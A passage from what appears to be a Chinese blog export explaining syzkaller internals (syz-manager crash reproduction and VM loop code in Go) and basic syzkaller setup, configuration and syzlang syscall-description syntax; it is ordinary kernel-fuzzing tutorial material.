&amp;ReproResult&#123;\t\tinstances: vmIndexes,\t\treport0:   crash.Report,\t\trepro:     res,\t\tstats:     stats,\t\terr:       err,\t\thub:       crash.hub,\t&#125;\tif err == nil &amp;&amp; res != nil &amp;&amp; mgr.cfg.StraceBin != &quot;&quot; &#123;\t\t// We need only one instance to get strace output, release the rest.\t\tputInstances(vmIndexes[1:]...)\t\tdefer putInstances(vmIndexes[0])\t\tconst straceAttempts = 2\t\tfor i := 1; i &lt;= straceAttempts; i++ &#123;\t\t\tstrace := repro.RunStrace(res, mgr.cfg, mgr.reporter, mgr.vmPool, vmIndexes[0])\t\t\tsameBug := strace.IsSameBug(res)\t\t\tlog.Logf(0, &quot;strace run attempt %d/%d for &#x27;%s&#x27;: same bug %v, error %v&quot;,\t\t\t\ti, straceAttempts, res.Report.Title, sameBug, strace.Error)\t\t\t// We only want to save strace output if it resulted in the same bug.\t\t\t// Otherwise, it will be hard to reproduce on syzbot and will confuse users.\t\t\tif sameBug &#123;\t\t\t\tret.strace = strace\t\t\t\tbreak\t\t\t&#125;\t\t&#125;\t&#125; else &#123;\t\tputInstances(vmIndexes...)\t&#125;\treturn ret&#125;\n\n这里主要做的事情其实就是直接调用了repro.Run函数，并且在后面进行了一下检查之后将vm重新放回资源池中。\nfunc Run(crashLog []byte, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,\tvmPool *vm.Pool, vmIndexes []int) (*Result, *Stats, error) &#123;\tctx, err := prepareCtx(crashLog, cfg, features, reporter, len(vmIndexes))\tif err != nil &#123;\t\treturn nil, nil, err\t&#125;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tctx.createInstances(cfg, vmPool)\t&#125;()\t// Prepare VMs in advance.\tfor _, idx := range vmIndexes &#123;\t\tctx.bootRequests &lt;- idx\t&#125;\t// Wait until all VMs are really released.\tdefer wg.Wait()\treturn ctx.run()&#125;\n\n可以看到这里首先调用了prepareCtx函数。\nfunc prepareCtx(crashLog []byte, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,\tVMs int) (*context, error) &#123;\tif VMs == 0 &#123;\t\treturn nil, fmt.Errorf(&quot;no VMs provided&quot;)\t&#125;\tentries := cfg.Target.ParseLog(crashLog)\tif len(entries) == 0 &#123;\t\treturn nil, ErrNoPrograms\t&#125;\tcrashStart := len(crashLog)\tcrashTitle, crashType := &quot;&quot;, crash.UnknownType\tif rep := reporter.Parse(crashLog); rep != nil &#123;\t\tcrashStart = rep.StartPos\t\tcrashTitle = rep.Title\t\tcrashType = rep.Type\t&#125;\ttestTimeouts := []time.Duration&#123;\t\t3 * cfg.Timeouts.Program, // to catch simpler crashes (i.e. no races and no hangs)\t\t20 * cfg.Timeouts.Program,\t\tcfg.Timeouts.NoOutputRunningTime, // to catch &quot;no output&quot;, races and hangs\t&#125;\tswitch &#123;\tcase crashTitle == &quot;&quot;:\t\tcrashTitle = &quot;no output/lost connection&quot;\t\t// Lost connection can be detected faster,\t\t// but theoretically if it&#x27;s caused by a race it may need the largest timeout.\t\t// No output can only be reproduced with the max timeout.\t\t// As a compromise we use the smallest and the largest timeouts.\t\ttestTimeouts = []time.Duration&#123;testTimeouts[0], testTimeouts[2]&#125;\tcase crashType == crash.MemoryLeak:\t\t// Memory leaks can&#x27;t be detected quickly because of expensive setup and scanning.\t\ttestTimeouts = testTimeouts[1:]\tcase crashType == crash.Hang:\t\ttestTimeouts = testTimeouts[2:]\t&#125;\tctx := &amp;context&#123;\t\ttarget:       cfg.SysTarget,\t\treporter:     reporter,\t\tcrashTitle:   crashTitle,\t\tcrashType:    crashType,\t\tcrashStart:   crashStart,\t\tentries:      entries,\t\tinstances:    make(chan *reproInstance, VMs),\t\tbootRequests: make(chan int, VMs),\t\ttestTimeouts: testTimeouts,\t\tstartOpts:    createStartOptions(cfg, features, crashType),\t\tstats:        new(Stats),\t\ttimeouts:     cfg.Timeouts,\t&#125;\tctx.reproLogf(0, &quot;%v programs, %v VMs, timeouts %v&quot;, len(entries), VMs, testTimeouts)\treturn ctx, nil&#125;\n\n函数内部主要做的事就是一些检测然后初始化ctx，函数结束之后定义可一个sync.WaitGroup类型的变量。随后创建一个新的协程调用ctx.createInstances函数。\nfunc (ctx *context) createInstances(cfg *mgrconfig.Config, vmPool *vm.Pool) &#123;\tvar wg sync.WaitGroup\tfor vmIndex := range ctx.bootRequests &#123;\t\twg.Add(1)\t\tvmIndex := vmIndex\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\tvar inst *instance.ExecProgInstance\t\t\tmaxTry := 3\t\t\tfor try := 0; try &lt; maxTry; try++ &#123;\t\t\t\tselect &#123;\t\t\t\tcase &lt;-vm.Shutdown:\t\t\t\t\ttry = maxTry\t\t\t\t\tcontinue\t\t\t\tdefault:\t\t\t\t&#125;\t\t\t\tvar err error\t\t\t\tinst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,\t\t\t\t\tctx.reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)\t\t\t\tif err != nil &#123;\t\t\t\t\tctx.reproLogf(0, &quot;failed to init instance: %v, attempt %d/%d&quot;,\t\t\t\t\t\terr, try+1, maxTry)\t\t\t\t\ttime.Sleep(10 * time.Second)\t\t\t\t\tcontinue\t\t\t\t&#125;\t\t\t\tbreak\t\t\t&#125;\t\t\tif inst != nil &#123;\t\t\t\tctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;\t\t\t&#125;\t\t&#125;()\t&#125;\twg.Wait()\t// Clean up.\tclose(ctx.instances)\tfor inst := range ctx.instances &#123;\t\tinst.execProg.Close()\t&#125;&#125;\n\n函数中，循环获取vmIndex，并且开启新的协程，在新的协程中调用instance.CreateExecProgInstance函数创建VM并拷贝crash程序，如果失败则休眠十秒如果成功则将结果输出到ctx.instances中，这里的最多尝试次数为maxTry。\nfunc CreateExecProgInstance(vmPool *vm.Pool, vmIndex int, mgrCfg *mgrconfig.Config,\treporter *report.Reporter, opt *OptionalConfig) (*ExecProgInstance, error) &#123;\tvmInst, err := vmPool.Create(vmIndex)\tif err != nil &#123;\t\treturn nil, fmt.Errorf(&quot;failed to create VM: %w&quot;, err)\t&#125;\tret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)\tif err != nil &#123;\t\tvmInst.Close()\t\treturn nil, err\t&#125;\treturn ret, nil&#125;\n\n这里CreateExecProgInstance函数的实现就是通过vmPool.Create创建启动虚拟机之后调用SetupExecProg函数拷贝要执行的二进制文件。\nfunc (ctx *context) run() (*Result, *Stats, error) &#123;\t// Indicate that we no longer need VMs.\tdefer close(ctx.bootRequests)\tres, err := ctx.repro()\tif err != nil &#123;\t\treturn nil, nil, err\t&#125;\tif res != nil &#123;\t\tctx.reproLogf(3, &quot;repro crashed as (corrupted=%v):\\n%s&quot;,\t\t\tctx.report.Corrupted, ctx.report.Report)\t\t// Try to rerun the repro if the report is corrupted.\t\tfor attempts := 0; ctx.report.Corrupted &amp;&amp; attempts &lt; 3; attempts++ &#123;\t\t\tctx.reproLogf(3, &quot;report is corrupted, running repro again&quot;)\t\t\tif res.CRepro &#123;\t\t\t\t_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)\t\t\t&#125; else &#123;\t\t\t\t_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)\t\t\t&#125;\t\t\tif err != nil &#123;\t\t\t\treturn nil, nil, err\t\t\t&#125;\t\t&#125;\t\tctx.reproLogf(3, &quot;final repro crashed as (corrupted=%v):\\n%s&quot;,\t\t\tctx.report.Corrupted, ctx.report.Report)\t\tres.Report = ctx.report\t&#125;\treturn res, ctx.stats, nil&#125;\n\n回到前面的RUN函数，最后会调用到ctx.run()，进入到上面的这个函数中，而在这个函数中则是调用ctx.repro()正式进行复现的。\nfunc (ctx *context) repro() (*Result, error) &#123;\t// Cut programs that were executed after crash.\tfor i, ent := range ctx.entries &#123;\t\tif ent.Start &gt; ctx.crashStart &#123;\t\t\tctx.entries = ctx.entries[:i]\t\t\tbreak\t\t&#125;\t&#125;\treproStart := time.Now()\tdefer func() &#123;\t\tctx.reproLogf(3, &quot;reproducing took %s&quot;, time.Since(reproStart))\t&#125;()\tres, err := ctx.extractProg(ctx.entries)\tif err != nil &#123;\t\treturn nil, err\t&#125;\tif res == nil &#123;\t\treturn nil, nil\t&#125;\tdefer func() &#123;\t\tif res != nil &#123;\t\t\tres.Opts.Repro = false\t\t&#125;\t&#125;()\tres, err = ctx.minimizeProg(res)\tif err != nil &#123;\t\treturn nil, err\t&#125;\t// Try extracting C repro without simplifying options first.\tres, err = ctx.extractC(res)\tif err != nil &#123;\t\treturn nil, err\t&#125;\t// Simplify options and try extracting C repro.\tif !res.CRepro &#123;\t\tres, err = ctx.simplifyProg(res)\t\tif err != nil &#123;\t\t\treturn nil, err\t\t&#125;\t&#125;\t// Simplify C related options.\tif res.CRepro &#123;\t\tres, err = ctx.simplifyC(res)\t\tif err != nil &#123;\t\t\treturn nil, err\t\t&#125;\t&#125;\treturn res, nil&#125;\n\n这里首先会去除掉发生crash之后执行的程序，随后调用ctx.extractProg获取触发crash的集合，接着调用ctx.minimizeProg尝试最小化程序集合，调用ctx.extractC函数尝试在不简化配置的情况下提取C repro，然后调用ctx.simplifyProg简化配置并尝试提取C repro，最后调用ctx.simplifyC简化C相关配置。\nfunc (ctx *context) extractProg(entries []*prog.LogEntry) (*Result, error) &#123;\tctx.reproLogf(2, &quot;extracting reproducer from %v programs&quot;, len(entries))\tstart := time.Now()\tdefer func() &#123;\t\tctx.stats.ExtractProgTime = time.Since(start)\t&#125;()\t// Extract last program on every proc.\tprocs := make(map[int]int)\tfor i, ent := range entries &#123;\t\tprocs[ent.Proc] = i\t&#125;\tvar indices []int\tfor _, idx := range procs &#123;\t\tindices = append(indices, idx)\t&#125;\tsort.Ints(indices)\tvar lastEntries []*prog.LogEntry\tfor i := len(indices) - 1; i &gt;= 0; i-- &#123;\t\tlastEntries = append(lastEntries, entries[indices[i]])\t&#125;\tfor _, timeout := range ctx.testTimeouts &#123;\t\t// Execute each program separately to detect simple crashes caused by a single program.\t\t// Programs are executed in reverse order, usually the last program is the guilty one.\t\tres, err := ctx.extractProgSingle(lastEntries, timeout)\t\tif err != nil &#123;\t\t\treturn nil, err\t\t&#125;\t\tif res != nil &#123;\t\t\tctx.reproLogf(3, &quot;found reproducer with %d syscalls&quot;, len(res.Prog.Calls))\t\t\treturn res, nil\t\t&#125;\t\t// Don&#x27;t try bisecting if there&#x27;s only one entry.\t\tif len(entries) == 1 &#123;\t\t\tcontinue\t\t&#125;\t\t// Execute all programs and bisect the log to find multiple guilty programs.\t\tres, err = ctx.extractProgBisect(entries, timeout)\t\tif err != nil &#123;\t\t\treturn nil, err\t\t&#125;\t\tif res != nil &#123;\t\t\tctx.reproLogf(3, &quot;found reproducer with %d syscalls&quot;, len(res.Prog.Calls))\t\t\treturn res, nil\t\t&#125;\t&#125;\tctx.reproLogf(0, &quot;failed to extract reproducer&quot;)\treturn nil, nil&#125;\n\n函数开始位置首先将程序逆序，随后调用ctx.extractProgSingle逐个运行单个程序，如果遇到crash则立刻返回（一般来说都是最后一个程序引起的）。如果没能找到则会进入到下面的判断中，如果程序个数不为1则会进入到ctx.extractProgBisect函数进行二分查找找出crash程序集合。\nfor !canRepro() &#123;  idx := instances.TakeOne()  if idx == nil &#123;    break  &#125;  log.Logf(1, &quot;loop: starting instance %v&quot;, *idx)  go func() &#123;    crash, err := mgr.runInstance(*idx)    runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;  &#125;()&#125;\n\n在看前面的两个小循环中的第二个循环，第二个循环的条件为不能进行crash复现，所以这里进入协程将剩余的VM调度去fuzz并将结果输出到runDone中去。\nfunc (mgr *Manager) runInstance(index int) (*Crash, error) &#123;\tmgr.checkUsedFiles()\tinstanceName := fmt.Sprintf(&quot;vm-%d&quot;, index)\trep, vmInfo, err := mgr.runInstanceInner(index, instanceName)\tmachineInfo := mgr.serv.shutdownInstance(instanceName)\tif len(vmInfo) != 0 &#123;\t\tmachineInfo = append(append(vmInfo, &#x27;\\n&#x27;), machineInfo...)\t&#125;\t// Error that is not a VM crash.\tif err != nil &#123;\t\treturn nil, err\t&#125;\t// No crash.\tif rep == nil &#123;\t\treturn nil, nil\t&#125;\tcrash := &amp;Crash&#123;\t\tvmIndex:     index,\t\thub:         false,\t\tReport:      rep,\t\tmachineInfo: machineInfo,\t&#125;\treturn crash, nil&#125;\n\n该函数实际调用的是mgr.runInstanceInner函数\nfunc (mgr *Manager) runInstanceInner(index int, instanceName string) (*report.Report, []byte, error) &#123;\tinst, err := mgr.vmPool.Create(index)\tif err != nil &#123;\t\treturn nil, nil, fmt.Errorf(&quot;failed to create instance: %w&quot;, err)\t&#125;\tdefer inst.Close()\tfwdAddr, err := inst.Forward(mgr.serv.port)\tif err != nil &#123;\t\treturn nil, nil, fmt.Errorf(&quot;failed to setup port forwarding: %w&quot;, err)\t&#125;\tfuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)\tif err != nil &#123;\t\treturn nil, nil, fmt.Errorf(&quot;failed to copy binary: %w&quot;, err)\t&#125;\t// If ExecutorBin is provided, it means that syz-executor is already in the image,\t// so no need to copy it.\texecutorBin := mgr.sysTarget.ExecutorBin\tif executorBin == &quot;&quot; &#123;\t\texecutorBin, err = inst.Copy(mgr.cfg.ExecutorBin)\t\tif err != nil &#123;\t\t\treturn nil, nil, fmt.Errorf(&quot;failed to copy binary: %w&quot;, err)\t\t&#125;\t&#125;\tfuzzerV := 0\tprocs := mgr.cfg.Procs\tif *flagDebug &#123;\t\tfuzzerV = 100\t\tprocs = 1\t&#125;\t// Run the fuzzer binary.\tstart := time.Now()\tatomic.AddUint32(&amp;mgr.numFuzzing, 1)\tdefer atomic.AddUint32(&amp;mgr.numFuzzing, ^uint32(0))\targs := &amp;instance.FuzzerCmdArgs&#123;\t\tFuzzer:    fuzzerBin,\t\tExecutor:  executorBin,\t\tName:      instanceName,\t\tOS:        mgr.cfg.TargetOS,\t\tArch:      mgr.cfg.TargetArch,\t\tFwdAddr:   fwdAddr,\t\tSandbox:   mgr.cfg.Sandbox,\t\tProcs:     procs,\t\tVerbosity: fuzzerV,\t\tCover:     mgr.cfg.Cover,\t\tDebug:     *flagDebug,\t\tTest:      false,\t\tRuntest:   false,\t\tOptional: &amp;instance.OptionalFuzzerArgs&#123;\t\t\tSlowdown:   mgr.cfg.Timeouts.Slowdown,\t\t\tRawCover:   mgr.cfg.RawCover,\t\t\tSandboxArg: mgr.cfg.SandboxArg,\t\t&#125;,\t&#125;\tcmd := instance.FuzzerCmd(args)\toutc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)\tif err != nil &#123;\t\treturn nil, nil, fmt.Errorf(&quot;failed to run fuzzer: %w&quot;, err)\t&#125;\tvar vmInfo []byte\trep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)\tif rep == nil &#123;\t\t// This is the only &quot;OK&quot; outcome.\t\tlog.Logf(0, &quot;%s: running for %v, restarting&quot;, instanceName, time.Since(start))\t&#125; else &#123;\t\tvmInfo, err = inst.Info()\t\tif err != nil &#123;\t\t\tvmInfo = []byte(fmt.Sprintf(&quot;error getting VM info: %v\\n&quot;, err))\t\t&#125;\t&#125;\treturn rep, vmInfo, nil&#125;\n\n这里首先调用mgr.vmPool.Create创建VM，随后调用inst.Forward进行TCP转发，然后通过inst.Copy拷贝syz-fuzzer和syz-executor到VM文件系统下。随后调用instance.FuzzerCmd函数生成命令行后调用inst.Run函数启动syz-fuzzer，随后调用inst.MonitorExecution监视VM运行，这个函数主要是通过获取kernel oops来判断是否出现了crash。\n这里提一下vm实例，在syz-manaer中的vm实例其实是如下结构体表示的。\ntype Instance struct &#123;\timpl     vmimpl.Instance\tworkdir  string\ttimeouts targets.Timeouts\tindex    int\tonClose  func()&#125;\n\n其需要定义一些interface接口\ntype Instance interface &#123;\t// Copy copies a hostSrc file into VM and returns file name in VM.\tCopy(hostSrc string) (string, error)\t// Forward sets up forwarding from within VM to the given tcp\t// port on the host and returns the address to use in VM.\tForward(port int) (string, error)\t// Run runs cmd inside of the VM (think of ssh cmd).\t// outc receives combined cmd and kernel console output.\t// errc receives either command Wait return error or vmimpl.ErrTimeout.\t// Command is terminated after timeout. Send on the stop chan can be used to terminate it earlier.\tRun(timeout time.Duration, stop &lt;-chan bool, command string) (outc &lt;-chan []byte, errc &lt;-chan error, err error)\t// Diagnose retrieves additional debugging info from the VM\t// (e.g. by sending some sys-rq&#x27;s or SIGABORT&#x27;ing a Go program).\t//\t// Optionally returns (some or all) of the info directly. If wait == true,\t// the caller must wait for the VM to output info directly to its log.\t//\t// rep describes the reason why Diagnose was called.\tDiagnose(rep *report.Report) (diagnosis []byte, wait bool)\t// Close stops and destroys the VM.\tClose()&#125;\n\n\n  Copy()：将一个来自宿主机的文件拷贝至虚拟机中，返回虚拟机中的文件名\n  Forward()：设置从虚拟机内到主机上给定 tcp 端口的转发，并返回要在虚拟机中使用的地址\n  Run()：在虚拟机内执行命令\n  Diagnose()：在虚拟机上检索额外的调试信息\n  Close()：停止并销毁虚拟机\n\n需要注意的是，不同的guest VM所实现的interface是不同的。\nfunc (mgr *Manager) vmLoop() &#123;  // ... ...\tfor shutdown != nil || instances.Len() != vmCount &#123;    // ... ...\t\tvar stopRequest chan bool\t\tif !stopPending &amp;&amp; canRepro() &#123;\t\t\tstopRequest = mgr.vmStop\t\t&#125;\twait:\t\tselect &#123;\t\tcase &lt;-instances.Freed:\t\t\t// An instance has been released.\t\tcase stopRequest &lt;- true:\t\t\tlog.Logf(1, &quot;loop: issued stop request&quot;)\t\t\tstopPending = true\t\tcase res := &lt;-runDone:\t\t\tlog.Logf(1, &quot;loop: instance %v finished, crash=%v&quot;, res.idx, res.crash != nil)\t\t\tif res.err != nil &amp;&amp; shutdown != nil &#123;\t\t\t\tlog.Logf(0, &quot;%v&quot;, res.err)\t\t\t&#125;\t\t\tstopPending = false\t\t\tinstances.Put(res.idx)\t\t\t// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,\t\t\t// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.\t\t\tif shutdown != nil &amp;&amp; res.crash != nil &#123;\t\t\t\tneedRepro := mgr.saveCrash(res.crash)\t\t\t\tif needRepro &#123;\t\t\t\t\tlog.Logf(1, &quot;loop: add pending repro for &#x27;%v&#x27;&quot;, res.crash.Title)\t\t\t\t\tpendingRepro[res.crash] = true\t\t\t\t&#125;\t\t\t&#125;\t\tcase res := &lt;-reproDone:\t\t\tatomic.AddUint32(&amp;mgr.numReproducing, ^uint32(0))\t\t\tcrepro := false\t\t\ttitle := &quot;&quot;\t\t\tif res.repro != nil &#123;\t\t\t\tcrepro = res.repro.CRepro\t\t\t\ttitle = res.repro.Report.Title\t\t\t&#125;\t\t\tlog.Logf(0, &quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;,\t\t\t\tres.instances, res.report0.Title, res.repro != nil, crepro, title)\t\t\tif res.err != nil &#123;\t\t\t\treportReproError(res.err)\t\t\t&#125;\t\t\tdelete(reproducing, res.report0.Title)\t\t\tif res.repro == nil &#123;\t\t\t\tif !res.hub &#123;\t\t\t\t\tmgr.saveFailedRepro(res.report0, res.stats)\t\t\t\t&#125;\t\t\t&#125; else &#123;\t\t\t\tmgr.saveRepro(res)\t\t\t&#125;\t\tcase &lt;-shutdown:\t\t\tlog.Logf(1, &quot;loop: shutting down...&quot;)\t\t\tshutdown = nil\t\tcase crash := &lt;-mgr.hubReproQueue:\t\t\tlog.Logf(1, &quot;loop: get repro from hub&quot;)\t\t\tpendingRepro[crash] = true\t\tcase reply := &lt;-mgr.needMoreRepros:\t\t\treply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;\t\t\t\tlen(reproQueue)+len(pendingRepro)+len(reproducing) == 0\t\t\tgoto wait\t\tcase reply := &lt;-mgr.reproRequest:\t\t\trepros := make(map[string]bool)\t\t\tfor title := range reproducing &#123;\t\t\t\trepros[title] = true\t\t\t&#125;\t\t\treply &lt;- repros\t\t\tgoto wait\t\t&#125;\t&#125;&#125;\n\n进入最后阶段，等待处理不同的channel数据，这里逐case分析。\n首先第一个的触发条件为instances.Freed即当空间的VM被Put返回资源池时则会向该channel送入一个true，进入其代码块，但是并没做什么事情。\n第二个的条件可以注意到前面的赋值操作stopRequest其实就是mgr.vmStop，而这个channel会在VM instance的RUN函数中使用。\n第三个的条件为res := &lt;-runDone当runDone中有数据时进入，其有数据代表的是有crash产生了，这里主要做的事就是将crash加入到pendingRepro中。\n第四个的条件就是复现时出现结果，这里主要做的事情是，从reproducing删除对应的crash，随后保存复现结果。\n第五个条件就是存在终止信号。\n第六个则是hubReproQueue也可能传来crash，如果传来了crash则将其加入到pendingRepro中。\n第七个根据mgr.needMoreRepros字面意思就是需要更多的repros，其内部代码就是判断当前阶段以及等待复现、复现队列、复现中的数量是否为0并将最后的结果返回到channel中并在此运行wait重新等待。\n最后mgr.reproRequest意为主动请求复现，这里会拷贝reproducing的位图并返回到channel中最后跳转wait重新等待。\n","categories":["FUZZ"],"tags":["FUZZ","syzkaller"]},{"title":"syzkaller基本使用","url":"/2023/11/10/syzkaller%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","content":"前言这篇文章在前面已经是埋了许多坑了，靠后的几篇文章都提到了我想学syzkaller，但是总有事耽搁以至于拖到了现在。本来没有打算将基本的使用方法写成文章的，但是就是前面的坑过多，如果不写出来的话就会觉得心里膈应。这一篇不会涉及到syzkaller的实现原理，只能默默祈祷不会太水。\n一样的，这里也就不多提如何编译了，网上的资料很多。\nsyzkaller使用工作原理\n经常看我文章的朋友或许看出来了，我不是很愿意将图片上到博客，主要原因还是我没有使用图床所以尽量少的上传图片，所以我一般放到博客的图片都是较为有用的图片。\n这里简单提一下上图：\n首先syz-manager作为的是syzkallmer的控制中枢，其会启动多个vm实例 ( 图中一个黄色卡片代表一个实例 ) 并进行监视，同时通过RPC启动syz-fuzzer。\nsyz-fuzzer负责引导整个fuzz的过程。第一步，生成input。第二步，启动syz-executor进程进行fuzz。第三步，从被fuzz的内核的/sys/kernel/debug/kcov获得覆盖 ( coverage ) 相关信息。最后，通过RPC将新的覆盖送回syz-manager。\nsyz-executor负责执行单个输入。\n配置文件在正式使用前我们需要为其额外编写配置文件\n&#123;    &quot;target&quot;: &quot;linux/amd64&quot;,    &quot;http&quot;: &quot;127.0.0.1:56741&quot;,    &quot;workdir&quot;: &quot;/media/psf/pwn/fuzz01&quot;,    &quot;kernel_obj&quot;: &quot;/home/parallels/linux-5.11&quot;,    &quot;image&quot;: &quot;/media/psf/pwn/fuzz01/bullseye.img&quot;,    &quot;sshkey&quot;: &quot;/media/psf/pwn/fuzz01/bullseye.id_rsa&quot;,    &quot;syzkaller&quot;: &quot;/home/parallels/fuzz/gopath/syzkaller&quot;,    &quot;procs&quot;: 8,    &quot;type&quot;: &quot;qemu&quot;,    &quot;vm&quot;: &#123;        &quot;count&quot;: 4,        &quot;kernel&quot;: &quot;/media/psf/pwn/fuzz01/bzImage&quot;,        &quot;cpu&quot;: 2,        &quot;mem&quot;: 2048    &#125;&#125;\n\n$&#123;WORKDIR&#125;是需要替换为所需的工作目录，之后生成的crash文件将会位于其中。$&#123;LINUX&#125;为Linux源码目录。$&#123;IMAGE&#125;为方才制作的系统镜像与密钥文件目录。$&#123;GOPATH&#125;替换为安装Syzkaller所使用的GOPATH。\n启动syzkaller启动就很简单了，直接输入\n./bin/syz-manager -config=config.json # config.json为前面提到的配置文件\n\n启动成功后通过访问localhost:56741即可获取到syzkaller的状态\nsyzlang编写指南如果只是上述流程中那样一直挂着可以出洞的话，大公司的服务器可比我这电脑好得不知道哪去了，所以我们需要人工配置系统调用模板，以有针对性的进行漏洞挖掘。\nsyzkaller 使用它自己的声明式语言来描述系统调用模板，在安装目录下的 docs/syscall_descriptions.md 与 docs/syscall_descriptions_syntax.md 中有着相关的说明。\n我们需要使用 syzlang 来编写特定的系统调用描述文件（也叫规则文件），syzkaller 会根据我们的描述文件有针对性地进行 fuzz。\nsyzlang语法syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]arg = argname typeargname = identifiertype = typename [ &quot;[&quot; type-options &quot;]&quot; ]typename = &quot;const&quot; | &quot;intN&quot; | &quot;intptr&quot; | &quot;flags&quot; | &quot;array&quot; | &quot;ptr&quot; |\t   &quot;string&quot; | &quot;strconst&quot; | &quot;filename&quot; | &quot;glob&quot; | &quot;len&quot; |\t   &quot;bytesize&quot; | &quot;bytesizeN&quot; | &quot;bitsize&quot; | &quot;vma&quot; | &quot;proc&quot;type-options = [type-opt [&quot;,&quot; type-opt]]\n\n上述即是syzlang的语法结构，这简单介绍一下上面符号的含义。\n\n&quot;&quot; 表示这个符号内的内容应按照其原样进行匹配\n|   表示的含义大差不差，意味取左右两边皆可\n=   表示左边的表达式应为右边的形式\n[] 表示取其内部的一个值\n*   表示和正则一样，即为0个或多个\n\n所以其写法为，syscallname + 多个arg组成。arg由标识符identifier与操作类型type构成。type由操作类型名typename以及对应类型的类型选择type-options组成，最后根据typename的不同，type-options跟一个或两个type-opt。\n根据上述规则可以很轻松的理解Google官方提供的一个模板\nopen(file filename, flags flags[open_flags], mode flags[open_mode]) fdread(fd fd, buf buffer[out], count len[buf])close(fd fd)open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n这里注释的写法就和python一样\n# aaaa\n\n文件包含的写法基本就和C一样\ninclude&lt;linux/fs.h&gt;\n\n参数前面中提到了参数的形式\narg = argname + type\n\n其有一个参数名加一个操作类型构成。下面根据例子详细讲一下\nSYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)\n\n上述是内核中read系统调用的声明，当我们使用 libc 的 wrapper 进行 read 系统调用时，形式如下：\nunsigned int \tmy_file_fd = open(&quot;/dev/test&quot;, O_RDONLY);char \t\t\tmy_buf[114514];size_t\t\t\tmy_count = 114514;read(my_file_fd, my_buf, my_count);\n\n在上述例子中fd、buf、count即为argname，my_file_fd、my_buf、my_count即为type\n那么在syzlang编写系统调用时就应该写为fd my_file_fd。( 这里假设my_file_fd已定义为resources )\n类型前面提到了arg是由argname type构成，也提到了type是由typename type-options构成。\ntype = typename [ &quot;[&quot; type-options &quot;]&quot; ]\n\n首先这里详细提一下类型名，即该 type 的类型，例如 C 当中的int、char、void 等等。\n常规的类型名包括：( 直接搬！)\n\n  opt：这是一个可选参数（例如 mmap 的 fd）\n\n其余 type-options 是基于特定 type 的，如下：\n\nconst：整型常数\n类型选项：\n  值（value）：例如 0\n  基础类型（underlying type）：intN 或 intptr 之一\n\n\n\n\nintN 或 intptr：一个有着特殊含义的整型，下文会进行详细说明\n类型选项：\n  可选范围区间：例如 &quot;1:100&quot; 表示取值值的区间为 [1, 100]\n  可选参数\n\n\n\n\nflags：值的集合\n类型选项：\n  对 flags 描述的引用\n  基础整型类型：例如 int32\n\n\n\n\narray：一个可变长/固定长度的数组\n类型选项：\n  元素的 type\n  可选长度区间：例如固定长度 &quot;5&quot; 或者长度范围 &quot;5:10&quot;（包括边界）\n\n\n\n\nptr 或 ptr64：指向一个对象的指针\n类型选项：\n  方向：in 或 out 或 inout\n  对象的 type\n\n\n  无论对象指针大小如何，ptr64 永远为 8 字节\n\n\nstring：一块有着 0 终止符的内存缓冲区\n类型选项：\n常量字符串/对字符串的引用\n  前者：例如 &quot;foo&quot;作为常规字符串进行解析，或者deadbeef作为4个 16 进制字节进行解析\n  后者：若是特殊类型 filename 则会生成文件名\n\n\n\n\n\n\nstringnoz：一块没有 0 终止符的内存缓冲区\n  类型选项：（同 string)\n\n\nglob：匹配目标文件的 glob（？）模式\n类型选项：\n  用引号包裹着的模式字符串：例如 &quot;/sys/&quot; 或 &quot;/sys/**/*/&quot;，具体用法参见https://pkg.go.dev/path/filepath#Match\n\n\n\n\nfmt：一个表示一个整数的字符串\n类型选项：\n  格式与值：前者可取值为 dec或 hex 或 oct；后者可以是一个 resource、int、flags、const 或 proc\n\n\n  最终的结果通常是固定尺寸的\n\n\nlen：另一个 字段 的长度（对于 array 而言为元素的数量）\n类型选项：\n  对象的 argname\n\n\n\n\nbytesize：与 len 类似，不过单位是字节\n类型选项：\n  对象的 argname\n\n\n\n\nbitsize：与 len 类型，不过单位是比特位\n类型选项：\n  对象的 argname\n\n\n\n\noffsetof：一个 字段 在其 parent struct 中的偏移\n类型选项：\n  字段\n\n\n\n\nvma 或 vma64：指向一组页的指针（用作 mmap/munmap/mremap/madvise 的输入）\n类型选项：\n  （可选）页的数量或页的范围：前者例如 vma[7]，后者例如 vma[2-4]\n\n\n  vma64 的长度恒为 8 字节\n\n\nproc：单个进程的整型（详见下面的描述）\n类型选项：\n  值的区间的起始\n  每个进程的值的数量\n  基础类型\n\n\n\n\ntext：特定 type 的机器码\n类型选项：\n  代码类型：x86_real, x86_16, x86_32, x86_64, arm64\n\n\n\n\nvoid：type with static size 0\n  通常在模板以及可变长（varlen）联合体中使用，不能用作系统调用的参数\n\n\n\n在 结构体/联合体/指针 中使用时，flags/len/flags 的构成中尾部还可以跟着 type type-options\n接着提一下类型选项\ntype-options = [type-opt [&quot;,&quot; type-opt]]\n\n形式如上，从一开始的语法规则来看type-options对于type即为可选项，也可以同时拥有多个type-options，同样根据前面的语法规则可以看出来要使用type-options是应如下例一样\nflags 